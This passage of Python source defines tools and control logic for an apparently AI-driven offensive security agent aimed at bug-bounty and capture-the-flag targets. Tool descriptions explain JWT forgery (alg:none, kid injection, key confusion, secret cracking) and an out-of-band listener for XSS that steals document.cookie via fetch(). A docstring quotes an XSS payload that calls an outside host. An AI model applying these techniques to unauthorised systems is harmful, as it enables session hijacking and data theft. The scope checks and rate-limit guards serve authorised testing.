                "length": {"type": "integer", "description": "Number of lines to read. Default is 200.", "default": 200}
            },
            "required": ["path"]
        },
        executor=_execute_read_artifact
    ),
    "load_skill": ToolSpec(
        name="load_skill",
        description="Load the full methodology for a named skill from the SKILL MENU in your system prompt. This is how you get methodology content — nothing is auto-injected for you. Check the menu and call this whenever a task would benefit from a specific methodology, before your first recon/exploit tool call.",
        parameters={
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "Exact skill name from the SKILL MENU, e.g. 'access-control', 'graphql-audit'."}
            },
            "required": ["name"]
        },
        executor=_execute_load_skill
    ),
    "record_finding": ToolSpec(
        name="record_finding",
        description="Log a finding you have ALREADY CONFIRMED (via curl/spider/other tools — not a plan or a guess) into the investigation's structured memory, so it persists across turns and feeds the running investigation summary. Use this once you've verified something real: a confirmed IDOR, a role you successfully escalated to, a token leak, etc. Do not use this to record intentions or untested hypotheses.",
        parameters={
            "type": "object",
            "properties": {
                "title": {"type": "string", "description": "One-line description of the confirmed finding, e.g. 'IDOR: account B's invoices readable from account A session'."},
                "kind": {"type": "string", "description": "Category, e.g. 'idor', 'auth_bypass', 'mass_assignment', 'interesting_endpoint'. Free text.", "default": "interesting_endpoint"},
                "severity": {"type": "string", "description": "Your assessed severity: critical, high, medium, or low.", "default": "medium"},
                "request_ref": {"type": "string", "description": "The URL/endpoint the finding applies to."},
                "note": {"type": "string", "description": "Optional extra detail — the specific request/response evidence that confirmed it."}
            },
            "required": ["title"]
        },
        executor=_execute_record_finding
    ),
    "gowitness": ToolSpec(
        name="gowitness",
        description="Capture high-fidelity visual web screenshots of URLs or endpoints using gowitness. Automatically saves screenshots to target workspace (~/.hellhound/targets/<target>/screenshots/) and indexes them into target investigation memory & visual evidence cards. Supports session cookies & custom headers to screenshot authenticated member portals and admin dashboards for vulnerability PoC.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to capture screenshot for (e.g. https://target.com/dashboard or https://target.com/admin)."},
                "urls": {"type": "array", "items": {"type": "string"}, "description": "Optional list of multiple target URLs to screenshot in batch."},
                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Cookie': 'session=abc123', 'Authorization': 'Bearer ...'})."},
                "cookies": {"type": "object", "description": "Optional session cookies dictionary or cookie string to screenshot authenticated pages."},
                "fullpage": {"type": "boolean", "description": "Capture full scrollable page instead of standard viewport (default: false).", "default": False},
                "delay": {"type": "integer", "description": "Delay in seconds before capturing to allow JavaScript rendering (default: 2).", "default": 2},
                "output_dir": {"type": "string", "description": "Optional custom directory path to save screenshots (defaults to target workspace)."}
            },
            "required": ["url"]
        },
        executor=_execute_gowitness
    ),
    "subfinder": ToolSpec(
        name="subfinder",
        description="Enumerate subdomains for a domain using passive sources and certificate transparency logs. Relies on public indexing, so it will return nothing for domains that aren't publicly indexed — if that happens, consider dns_bruteforce or httpx instead.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target root domain to enumerate subdomains for."}
            },
            "required": ["domain"]
        },
        executor=_execute_subfinder
    ),
    "httpx": ToolSpec(
        name="httpx",
        description="Probe live web services, status codes, page titles, and web technology stack.",
        parameters={
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target domain, URL, or list of subdomains to probe."}
            },
            "required": ["target"]
        },
        executor=_execute_httpx
    ),
    "subzy": ToolSpec(
        name="subzy",
        description="Verify CNAME records and test for potential dangling DNS subdomain takeover vulnerabilities.",
        parameters={
            "type": "object",
            "properties": {
                "subdomain": {"type": "string", "description": "Subdomain to verify for takeover vulnerability."}
            },
            "required": ["subdomain"]
        },
        executor=_execute_subzy
    ),
    "takeover_scanner": ToolSpec(
        name="takeover_scanner",
        description="Active CNAME/fingerprint-based subdomain takeover scanner targeting AWS, GitHub Pages, Heroku, Shopify, etc.",
        parameters={
            "type": "object",
            "properties": {
                "subdomains": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "List of subdomains to scan. Defaults to all active target subdomains."
                }
            }
        },
        executor=_execute_takeover_scanner
    ),
    "hackerone_search": ToolSpec(
        name="hackerone_search",
        description="Search HackerOne Hacktivity for disclosed reports to learn about past vulnerability classes on the target or industry.",
        parameters={
            "type": "object",
            "properties": {
                "keyword": {"type": "string", "description": "Search term (e.g. ssrf, bypass, subdomain takeover)."},
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."},
                "limit": {"type": "integer", "description": "Max results to return (default: 10).", "default": 10}
            }
        },
        executor=_execute_hackerone_search
    ),
    "hackerone_policy": ToolSpec(
        name="hackerone_policy",
        description="Retrieve public policy, safe harbor terms, and in-scope asset identifiers for a HackerOne program.",
        parameters={
            "type": "object",
            "properties": {
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."}
            },
            "required": ["program"]
        },
        executor=_execute_hackerone_policy
    ),
    "hackerone_stats": ToolSpec(
        name="hackerone_stats",
        description="Retrieve public program statistics (bounty ranges, response times, resolved report counts) for a HackerOne program.",
        parameters={
            "type": "object",
            "properties": {
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."}
            },
            "required": ["program"]
        },
        executor=_execute_hackerone_stats
    ),
    "dig": ToolSpec(
        name="dig",
        description="Perform non-destructive DNS queries for A, CNAME, TXT, MX, and NS records.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to resolve."},
                "type": {"type": "string", "description": "DNS record type: A, CNAME, TXT, MX, NS", "default": "A"}
            },
            "required": ["domain"]
        },
        executor=_execute_dig
    ),
    "curl": ToolSpec(
        name="curl",
        description="Fetch HTTP response headers and body preview for an endpoint with standard BugBounty identity headers. Supports GET, POST, PUT, DELETE with custom headers, cookies, JSON objects, and string payloads.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Full URL to request."},
                "method": {"type": "string", "description": "HTTP Method: GET, HEAD, POST, PUT, DELETE", "default": "GET"},
                "headers": {"type": "object", "description": "Optional custom HTTP headers dictionary (e.g. {'Content-Type': 'application/json', 'Cookie': 'session=...'})."},
                "cookies": {"type": "object", "description": "Optional cookies dictionary or string."},
                "json": {"type": "object", "description": "JSON payload object to send in the request body (automatically sets Content-Type: application/json)."},
                "data": {"type": "string", "description": "Raw string payload or URL-encoded form data to send in request body."}
            },
            "required": ["url"]
        },
        executor=_execute_curl
    ),
    "jwt_forge": ToolSpec(
        name="jwt_forge",
        description="Decode ANY dot-separated, base64url-looking token or cookie value you're holding — real JWTs AND framework-signed session cookies (Flask/itsdangerous, and similar) share the same 'segment.segment.segment' shape, and you cannot tell which one you have until you decode it. Call this on every such value, including cookies literally named 'session' — do NOT skip it just because the cookie name doesn't say 'jwt' or 'token'. Do NOT use only on values named sess_/connect.sid/PHPSESSID — those ARE genuinely opaque random IDs with nothing to decode, skip only those. Two outcomes: (1) it's a real JWT (has header+payload claims) — the tool attempts forgery/privilege-escalation techniques against it (alg:none, kid_injection, jwk_injection, hs256 confusion, and hs_crack). (2) it's NOT a real JWT (e.g. a Flask session) — the tool decodes it anyway and returns the raw decoded content in 'decoded_session_content' instead of forging claims; READ THAT CONTENT, since flags, secrets, or other sensitive data are frequently stored directly inside a session payload, especially in CTF-style labs — this is often faster than chasing an out-of-band callback. RECOMMENDED WORKFLOW for real JWTs: call with default algorithm='all' first — this runs only the free, no-secret-needed techniques (alg:none case/format variants, kid header path-traversal to /dev/null, embedded-JWK header self-signing, and RS256->HS256 public-key confusion if public_key_or_secret is given). Test those forged_tokens against the server. Only if all are rejected, escalate by calling again with algorithm='hs_crack' to brute-force the real HMAC secret against a built-in common-secret wordlist — this is deliberately NOT part of the default 'all' bundle, since it's the expensive fallback, not the first move. A hit produces a *legitimately* signed token, not just a bypass guess. The result's 'hs_crack_available' field tells you whether that escalation applies to this token. Automatically updates session state with the primary (best) forged token for subsequent tool calls.",
        parameters={
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "Original JWT string to base forgery on. If omitted, uses active session token from target state."
                },
                "claims": {
                    "type": "object",
                    "description": "Key-value dictionary of claims to modify or add (e.g. {'role': 'admin', 'isAdmin': true, 'admin': true}). Default: {'role': 'admin'}."
                },
                "algorithm": {
                    "type": "string",
                    "description": "Which technique(s) to run: 'all' (default — free techniques only: alg:none, kid_injection, jwk_injection, and hs256 confusion if a key is supplied), 'none' (unsigned alg bypass only), 'kid_injection' (kid path-traversal to /dev/null only), 'jwk_injection' (embedded self-signed RSA key only), 'hs256' (RS256->HS256 public-key confusion only — needs public_key_or_secret), or 'hs_crack' (brute-force the real HMAC secret — call this explicitly as a second step only after the free 'all' variants were tested and rejected by the server).",
                    "default": "all"
                },
                "public_key_or_secret": {
                    "type": "string",
                    "description": "RSA Public Key PEM string or HMAC secret key for HS256 confusion signing (optional). Tried across several byte-encodings automatically since exact PEM formatting varies between JWT libraries."
                },
                "wordlist": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Optional extra secrets to test during hs_crack, tried alongside the built-in common-secret list (e.g. app/domain-specific guesses)."
                }
            }
        },
        executor=_execute_jwt_forge
    ),
    "listener": ToolSpec(
        name="listener",
        description="Start or poll a local out-of-band (OOB) HTTP listener to confirm blind or stored vulnerabilities where there's no direct response leakage — stored/blind XSS exfiltrating document.cookie via fetch(), blind SSRF, blind SQLi/XXE, etc. Use action='start' first to get a callback URL, embed that URL (with a unique token) in your payload, deliver the payload, then use action='poll' with that same token to check whether the target called back and what data it sent.",
        parameters={
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "description": "'start' (spin up the listener and return its callback URL — safe to call again, reuses the same listener), 'poll' (wait up to 'timeout' seconds for a callback containing 'token'), or 'stop' (shut the listener down).",
                    "default": "start"
                },
                "token": {
                    "type": "string",
                    "description": "Required for action='poll'. The unique string you embedded in the callback URL used in the payload, so the hit can be matched to this specific test."
                },
                "timeout": {
                    "type": "integer",
                    "description": "Seconds to wait for a callback during action='poll' (max 300). Default 45. Past hits are never discarded, so a short poll called later will still catch a callback that arrived after an earlier poll's window ended — you don't need one giant timeout to avoid missing a delayed hit. That said, reviewed/moderated submissions (see the xss skill) can take much longer than any single poll window — if several polls come back empty, don't conclude the vector failed; consider a longer wait or re-delivering the payload before ruling it out.",
                    "default": 45
                }
            }
        },
        executor=_execute_listener
    ),
    "spider": ToolSpec(
        name="spider",
        description="Crawl target web application to discover endpoints, URL parameters, form fields, and JavaScript assets. Supports authenticated crawling with session cookies or Authorization headers.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL of the target application to crawl."},
                "depth": {"type": "integer", "description": "Crawl recursion depth (default: 2)", "default": 2},
                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Authorization': 'Bearer ...'})."},
                "cookies": {"type": "object", "description": "Optional session cookies string or dictionary to crawl authenticated pages."}
            },
            "required": ["url"]
        },
        executor=_execute_spider
    ),
    "wafbuster": ToolSpec(
        name="wafbuster",
        description="Detect WAF / CDN signatures and security headers on the target web application.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to inspect for WAF presence."}
            },
            "required": ["url"]
        },
        executor=_execute_wafbuster
    ),
    "surface_auditor": ToolSpec(
        name="surface_auditor",
        description="Discover exposed API routes, documentation endpoints (OpenAPI/Swagger), and sensitive files.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target web application URL to audit."}
            },
            "required": ["url"]
        },
        executor=_execute_surface_auditor
    ),
    "cors_checker": ToolSpec(
        name="cors_checker",
        description="Audit CORS policy for arbitrary origin reflection and credential exposure.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Endpoint URL to test for CORS misconfiguration."}
            },
            "required": ["url"]
        },
        executor=_execute_cors_checker
    ),
    "graphql_probe": ToolSpec(
        name="graphql_probe",
        description="Detect GraphQL endpoints and check for public introspection availability.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to probe for GraphQL schema."}
            },
            "required": ["url"]
        },
        executor=_execute_graphql_probe
    ),
    "dns_bruteforce": ToolSpec(
        name="dns_bruteforce",
        description=(
            "Active DNS brute-force via shuffledns (massdns-backed with wildcard handling) — use this when passive "
            "subfinder returns few or no results, especially for internal, private, or non-publicly-indexed targets "
            "(e.g. CTF/lab domains) where certificate transparency logs won't have anything indexed."
        ),
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Root domain to brute-force."}
            },
            "required": ["domain"]
        },
        executor=_execute_shuffledns
    ),
    "vhost_fuzz": ToolSpec(
        name="vhost_fuzz",
        description=(
            "Virtual-host fuzzing via ffuf — finds sites sharing an IP that don't "
            "have their own DNS entry, common on CTF infrastructure and internal "
            "environments where multiple challenges/apps share one host."
        ),
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Base domain for the Host header."},
                "target_ip": {"type": "string", "description": "IP or URL to fuzz against."}
            },
            "required": ["domain", "target_ip"]
        },
        executor=_execute_ffuf_vhost
    ),
    "port_scan": ToolSpec(
        name="port_scan",
        description="Active TCP/UDP port scanner via naabu to discover open ports and non-standard web service ports.",
        parameters={
            "type": "object",
            "properties": {
                "hosts": {"type": "string", "description": "Target host, IP, domain, or comma-separated list of hosts to scan ports for."},
                "ports": {"type": "string", "description": "Ports to scan (e.g. 'top-100', 'top-1000', 'full', '80,443,8000-9000')", "default": "top-100"}
            },
            "required": ["hosts"]
        },
        executor=_execute_port_scan
    ),
    "permute_subdomains": ToolSpec(
        name="permute_subdomains",
        description="Generate subdomain mutations and permutations via alterx based on known subdomains or patterns.",
        parameters={
            "type": "object",
            "properties": {
                "subdomains": {"type": "array", "items": {"type": "string"}, "description": "List of discovered subdomains to generate permutations from."},
                "limit": {"type": "integer", "description": "Maximum number of candidate permutations to generate (default: 500)", "default": 500}
            },
            "required": ["subdomains"]
        },
        executor=_execute_permute_subdomains
    ),
    "resolve_candidates": ToolSpec(
        name="resolve_candidates",
        description="Fast bulk DNS resolution and filtering via dnsx to identify live resolvable domains and IP mappings.",
        parameters={
            "type": "object",
            "properties": {
                "candidates": {"type": "array", "items": {"type": "string"}, "description": "List of candidate domain names or permutations to resolve."}
            },
            "required": ["candidates"]
        },
        executor=_execute_resolve_candidates
    ),
    "tls_cert_scan": ToolSpec(
        name="tls_cert_scan",
        description="Scan TLS/SSL certificates and extract Subject Alternative Names (SANs) and Common Names (CNs) via tlsx.",
        parameters={
            "type": "object",
            "properties": {
                "hosts": {"type": "string", "description": "Target host, domain, or comma-separated list of hosts to inspect TLS certificates for."},
                "port": {"type": "string", "description": "Port to connect for TLS handshake (default: 443)", "default": "443"}
            },
            "required": ["hosts"]
        },
        executor=_execute_tls_cert_scan
    ),
    "content_discovery": ToolSpec(
        name="content_discovery",
        description="Active path and directory discovery fuzzing via ffuf on live web endpoints to reveal hidden routes and assets.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL of the target application to fuzz."}
            },
            "required": ["url"]
        },
        executor=_execute_ffuf_content
    ),
    "run_terminal_command": ToolSpec(
        name="run_terminal_command",
        description="Run an arbitrary terminal command or Kali tool (e.g., custom nmap, gobuster, sqlmap, custom ffuf pipes) targeting a specific host. You MUST specify the target host parameter for scope validation.",
        parameters={
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The exact shell command line string to execute."},
                "target": {"type": "string", "description": "The target domain, IP, or URL being tested (used for safety scope verification)."}
            },
            "required": ["command", "target"]
        },
        executor=_execute_terminal_command
    ),
    "hydra": ToolSpec(
        name="hydra",
        description="Hydra multi-engine logic & parameter anomaly analyzer — tests endpoints for logic flaws, race conditions, differential parameter handling, and broken access controls.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base target URL to analyze."},
                "concurrency": {"type": "integer", "description": "Number of concurrent workers (default: 10).", "default": 10},
                "enable_probing": {"type": "boolean", "description": "Enable active differential mutation probes (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_hydra
    ),
    "cloudscout": ToolSpec(
        name="cloudscout",
        description="CloudScout cloud asset discovery — identifies AWS S3 buckets, Azure Blob storage, Google Cloud Storage buckets, and Firebase databases exposed in application responses, JS files, or endpoints.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target base URL to scan."},
                "verify_public": {"type": "boolean", "description": "Actively check if discovered cloud storage buckets/resources are publicly accessible (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_cloudscout
    ),
    "transport_auditor": ToolSpec(
        name="transport_auditor",
        description="Transport & cookie security auditor — inspects SSL/TLS certificates, cipher suites, HSTS enforcement, and cookie security flags (Secure, HttpOnly, SameSite).",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL or hostname to audit."},
                "check_ssl": {"type": "boolean", "description": "Audit SSL/TLS certificate validity and protocol versions (default: true).", "default": True},
                "check_https": {"type": "boolean", "description": "Audit HTTPS enforcement and HSTS header presence (default: true).", "default": True},
                "check_cookies": {"type": "boolean", "description": "Audit cookie security flags on response headers (default: true).", "default": True},
                "check_payment": {"type": "boolean", "description": "Audit PCI-DSS transport requirements if payment flows detected (default: true).", "default": True}
            },
            "required": ["url"]
        },
        executor=_execute_transport_auditor
    ),
    "fuzz_hunter": ToolSpec(
        name="fuzz_hunter",
        description="FUZZhunter intelligent recursive path discovery — performs deep recursive fuzzing with dynamic 404 similarity calibration and custom wordlists.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target base URL to fuzz."},
                "max_depth": {"type": "integer", "description": "Maximum recursive discovery depth (default: 2).", "default": 2},
                "threads": {"type": "integer", "description": "Concurrent HTTP workers (default: 10).", "default": 10},
                "quick": {"type": "boolean", "description": "Quick mode with top-priority wordlist paths only (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_fuzz_hunter
    ),
}


# Capability fast-path removed to allow natural LLM responses


# ==========================================================
# AGENT REASONING & EXECUTION LOOP
# ==========================================================

def extract_path_scope(user_text: str) -> Optional[str]:
    """
    If the user's task text names a specific URL (e.g. "...from this endpoint https://host/app"),
    return that first path segment (e.g. "/app") as the task's path scope.

    Multi-tenant hosts (several independent applications or challenges living under
    different top-level paths on the same domain) — a task scoped to one endpoint should
    not wander into the others. Returns None if no explicit full URL path is present
    so an existing established target path scope is not accidentally overwritten by casual path mentions.
    """
    if not user_text:
        return None
    # 1. Full URL check (e.g. https://host/pulse or http://target/app/login)
    m = re.search(r'https?://[^\s"\']+', user_text)
    if m:
        raw_url = m.group(0).rstrip(".,;:!?)>\"'")
        try:
            parsed = urlparse(raw_url)
            path = parsed.path or ""
            segments = [s.strip(".,;:!?)>\"'") for s in path.split("/") if s.strip(".,;:!?)>\"'")]
            if segments:
                return "/" + segments[0]
        except Exception:
            pass

    # 2. Explicit scope specification command (e.g. "scope /app", "target /pulse")
    m_path = re.search(r'(?:scope|target|path)\s+(/[a-zA-Z0-9_\-\.]+)', user_text, re.IGNORECASE)
    if m_path:
        cand = m_path.group(1).rstrip(".,;:!?)>\"'")
        segments = [s for s in cand.split("/") if s]
        if segments and segments[0].lower() not in ("setup", "scope", "target", "recon", "help", "clear", "quit", "exit", "root", "api"):
            return "/" + segments[0]

    return None


def _url_in_path_scope(url: str, path_scope: str) -> bool:
    """True if url's path falls under path_scope (e.g. '/app')."""
    try:
        p = (urlparse(url).path or "").rstrip("/")
        scope = path_scope.rstrip(".,;:!?)>\"'").rstrip("/")
    except Exception:
        return True
    return p == scope or p.startswith(scope + "/")


def _strip_payload_context(text: str) -> str:
    """
    Strips code/markup spans that are almost certainly payload or example
    content being discussed — an XSS/SQLi/SSRF string, a PoC snippet — not
    an actual target designation. Without this, a question like 'is my
    payload "<img src=x onerror=\"fetch(\'http://host/x\')\">" correct?' has
    its embedded URL extracted as THE target, silently switching the agent
    into live recon/attack mode against a host the researcher never asked
    to be hit — they asked whether a string was well-formed, nothing more.
    Run before target extraction so payload content can't railroad it.
    """
    if not text:
        return text
    cleaned = text
    # Fenced code blocks and inline code spans — almost always examples/PoCs.
    cleaned = re.sub(r'```[\s\S]*?```', ' ', cleaned)
    cleaned = re.sub(r'`[^`]*`', ' ', cleaned)
    # HTML/markup payload span: strip everything from the first '<' to the
    # last '>' in the message. A quote-pairing regex can't reliably parse
    # this — HTML attributes routinely nest a quote inside a quote (e.g.
    # onerror="fetch('...')" sitting inside an outer-quoted "<img ...>"),
    # which breaks simple non-nested quote matching but doesn't matter at
    # all here: bracket-bounding just removes the whole tag-like span,
    # URL and all, regardless of what quoting is inside it.
    first_lt = cleaned.find('<')
    last_gt = cleaned.rfind('>')
    if first_lt != -1 and last_gt != -1 and last_gt > first_lt:
        cleaned = cleaned[:first_lt] + ' ' + cleaned[last_gt + 1:]
    return cleaned


def _extract_first_balanced_json(text: str) -> Optional[dict]:
    """
    Find the first '{' in text and parse the balanced JSON object it opens,
    by scanning brace depth (string/escape-aware) rather than regex-matching
    greedily to the LAST '}' anywhere in the text.

    Without this, a tool-call response with one stray trailing character
    after an otherwise well-formed object — e.g. the model emitting
    '{"tool": "curl", "args": {...}}}' with one extra closing brace, seen in
    practice on payload-heavy args like an XSS string containing its own
    parens/braces — makes the old greedy `\\{[\\s\\S]*\\}` regex capture that
    trailing junk too, so json.loads fails on the whole thing, the tool call
    is silently dropped, and the raw malformed JSON was falling through
    every guard (it doesn't match any narration keyword either) straight to
    the user as the "final answer" instead of ever executing or retrying.
    """
    start = text.find("{")
    if start == -1:
        return None
    depth = 0
    in_string = False
    escape = False
    for i in range(start, len(text)):
        ch = text[i]
        if in_string:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == '"':
                in_string = False
            continue
        if ch == '"':
            in_string = True
        elif ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                candidate = text[start:i + 1]
                try:
                    parsed = json.loads(candidate)
                    return parsed if isinstance(parsed, dict) else None
                except Exception:
                    return None
    return None


def extract_target_from_text(user_text: str) -> Optional[str]:
    """
    Extracts a target domain, IP address, or host from user text — the RAW
    match, not filesystem-sanitized (that split happens downstream in
    create_or_load_target, which needs both the safe folder name AND the
    real connectable host[:port]; sanitizing here would destroy the colon
    before it ever reaches that split).
    Handles:
    - Full URLs: http://10.49.135.46/ -> 10.49.135.46
    - IPv4 addresses: 10.49.135.46, 192.168.1.1:8080
    - Standard domain names: example.com, sub.target.ctf.io
    - Local hostnames: localhost, htb.local
    Payload/code content (quoted HTML/JS snippets, code blocks) is stripped
    before matching — see _strip_payload_context.
    """
    if not user_text:
        return None
    scan_text = _strip_payload_context(user_text)
    url_match = re.search(r'https?://([a-zA-Z0-9._-]+(?::\d+)?)', scan_text)
    if url_match:
        return url_match.group(1)
    ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b', scan_text)
    if ip_match:
        return ip_match.group(0)
    # Domain suffix must be a real TLD — "word.word" alone is not enough.
    # Without this check, any two words separated by a period in an
    # ordinary sentence ("Dr.Doom", "Mr.Robot", "vs.us") gets treated as a
    # legitimate scan target, which is how a casual pop-culture question
    # about a fictional character ends up running subfinder and DNS
    # bruteforce against it. This covers the TLDs that actually show up in
    # real bug bounty/CTF targets — not exhaustive of every IANA TLD, but
    # explicitly NOT "any short alphabetic string after a dot."
    _COMMON_TLDS = (
        "com", "net", "org", "io", "dev", "app", "co", "gov", "edu", "mil",
        "info", "biz", "xyz", "live", "site", "online", "tech", "cloud",
        "security", "ai", "me", "tv", "cc", "local", "ctf", "htb", "lab",
        "us", "uk", "de", "in", "au", "ca", "fr", "jp", "nl", "eu", "ru",
        "br", "it", "es", "cn", "kr", "id", "za", "mx", "ch", "se", "no",
        "fi", "dk", "pl", "be", "at", "nz", "ie", "sg", "hk", "tw", "il",
    )
    dom_match = re.search(r'\b([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.([a-zA-Z0-9]{2,}))\b', scan_text)
    if dom_match and dom_match.group(2).lower() in _COMMON_TLDS:
        return dom_match.group(1)
    local_match = re.search(r'\b(localhost|htb\.local)\b', scan_text, re.IGNORECASE)
    if local_match:
        return local_match.group(0)
    return None


def _extract_preserved_artifacts(content: str) -> str:
    """
    Scans untruncated tool output content for high-value security artifacts
    (JWTs, Bearer tokens, Session/API keys, URLs, Emails) and returns a formatted
    [PRESERVED ARTIFACTS ...] header block, or empty string if none found.
    """
    if not content:
        return ""

    jwts = sorted(set(re.findall(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", content)))
    bearer_tokens = sorted(set(re.findall(r"Bearer\s+[A-Za-z0-9._~+/-]+=*", content)))
    session_keys = sorted(set(re.findall(r"(?:session|sid|token|auth|api[_-]?key)[\"'=:\s]+[A-Za-z0-9._-]{8,}", content, re.IGNORECASE)))
    urls = sorted(set(re.findall(r"https?://[^\s\"'<>]+", content)))
    emails = sorted(set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", content)))

    lines = []
    if jwts:
        lines.append(f"JWTs: {', '.join(jwts)}")
    if bearer_tokens:
        lines.append(f"Bearer tokens: {', '.join(bearer_tokens)}")
    if session_keys:
        lines.append(f"Session/API keys: {', '.join(session_keys)}")
    if urls:
        lines.append(f"URLs: {', '.join(urls)}")
    if emails:
        lines.append(f"Emails: {', '.join(emails)}")

    if not lines:
        return ""

    header = "[PRESERVED ARTIFACTS — extracted before truncation, may include entries from the cut middle section]\n"
    return header + "\n".join(lines) + "\n\n"


_CONVERSATIONAL_STARTERS = re.compile(
    r'^\s*(why|what|who|how|when|where|explain|tell me|can you explain|damn|dam|wow|nice|'
    r'good|great|awesome|thanks|thank you|lol|lmao|haha|nvm|never\s*mind|'
    # Greetings — previously missing, so a plain "hi"/"hey" with a target
    # already set (has_real_target) fell through to the full orchestrator
    # loop (heavy TARGET/SCOPE/tools system prompt) instead of the fast
    # casual-synthesis path, turning a one-word greeting into two full LLM
    # round-trips. classify_intent() in ai_utils.py already special-cased
    # these same words as "chat" but was never wired into this gate — it's
    # dead code; this is the actual gate that matters.
    r'hi|hey|hello|yo|sup|howdy|greetings|morning|evening|afternoon)\b',
    re.I
)
_ACTION_VERBS = re.compile(
    r'\b(try|test|attempt|access|exploit|register|log\s*in|login|find|get|hack|scan|curl|'
    r'probe|crawl|enumerate|brute\s*force|inject|forge|bypass|escalate|dump|extract|steal|'
    r'take\s*over|takeover|check\s+if|verify\s+if|confirm\s+if|continue|keep\s+going|resume|'
    r'next\s+step|do\s+it|go\s+ahead|proceed|run\b)\b',
    re.I
)
_RETROSPECTIVE_MARKERS = re.compile(
    r'^\s*(why\s+did\s+you|why\s+(did|does|is|was)\s+(he|it|that)|what\s+made\s+you|'
    r'did\s+you|have\s+you|what\s+did\s+you|how\s+did\s+you)\b',
    re.I
)
_NEW_TARGET_SIGNAL = re.compile(
    r'(https?://|your target is|\bthe target\b|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', re.I
)


def _confidently_conversational(text: str) -> bool:
    """
    A deterministic, code-level pre-gate — checked BEFORE the orchestrator
    loop is entered at all, not inside its prompt. Deliberately asymmetric:
    it can only confidently say "skip tools, this is pure conversation,"
    never "force tools, this is definitely an instruction." The forcing
    side always stays with the model's own judgment — this only closes the
    specific, repeatedly-observed gap (explain/recap/praise turns still
    running tools), it doesn't reduce flexibility for real instructions,
    ambiguous phrasing, or creative task framing, which all still reach the
    model's full reasoning exactly as before. If in doubt, this returns
    False and the turn proceeds through the orchestrator as usual.
    """
    t = text.strip()
    if not t:
        return False
    if _NEW_TARGET_SIGNAL.search(t):
        return False
    # A retrospective question ("why did you try X", "what made you do
    # that") legitimately contains an action-verb WORD describing something
    # already done, not a new instruction to do it — don't let that block
    # the conversational classification the way a bare "register" or
    # "try X" (an actual new imperative) correctly should.
    is_retrospective = bool(_RETROSPECTIVE_MARKERS.match(t))
    if _ACTION_VERBS.search(t) and not is_retrospective:
        return False
    return bool(_CONVERSATIONAL_STARTERS.match(t))


class Agent:
    # ── Rolling memory digest thresholds ────────────────────────────────
    # Raw self.history entries carry full-fidelity content (tool results up
    # to 25k chars each — see _get_trimmed_history). Left unbounded, that
    # gets resent on every future turn, including a plain "hi", which is
    # what actually made turns slow after a session ran real recon. Once
    # the raw log passes _HISTORY_COMPACT_TRIGGER entries, everything
    # older than the most recent _HISTORY_KEEP_RAW is folded into a terse
    # narrative digest (session_digest) and dropped from self.history —
    # the digest rides along in the system prompt instead, at a fraction
    # of the size.
    _HISTORY_COMPACT_TRIGGER = 14
    _HISTORY_KEEP_RAW = 8
    _DIGEST_CHAR_CAP = 4000

    def __init__(self, target: Optional[Target] = None):
        self.target = target or create_or_load_target("default")
        self.history: List[Dict[str, str]] = self.target.state.get("history") or []
        if not isinstance(self.history, list):
            self.history = []
        # Condensed rolling memory of everything older than the raw window
        # above — per-target (stored in target.state), so a brand-new
        # target/session never inherits another investigation's digest or
        # history. See _compact_history_if_needed().
        self.session_digest: str = self.target.state.get("session_digest") or ""
        # Guards background compaction (see _compact_history_if_needed) so
        # a second trigger firing while one summarization pass is still in
        # flight skips instead of stacking up concurrent LLM calls.
        self._compaction_lock = threading.Lock()
        self.guard = AutopilotGuard(
            circuit_threshold=5,
            circuit_cooldown=60.0,
            recon_rps=10.0,
            test_rps=1.0,
            safe_methods_only=True
        )
        self._turn_path_scope: Optional[str] = None  # e.g. "/app" — set per-turn in handle_message
        self._forced_skill: Optional[str] = None  # set by /skill-name slash command — one-shot, consumed next turn

    def _compact_history_if_needed(self) -> None:
        """
        Trims old raw turns out of self.history immediately — synchronous,
        cheap, no I/O — which is what actually keeps future prompts small.
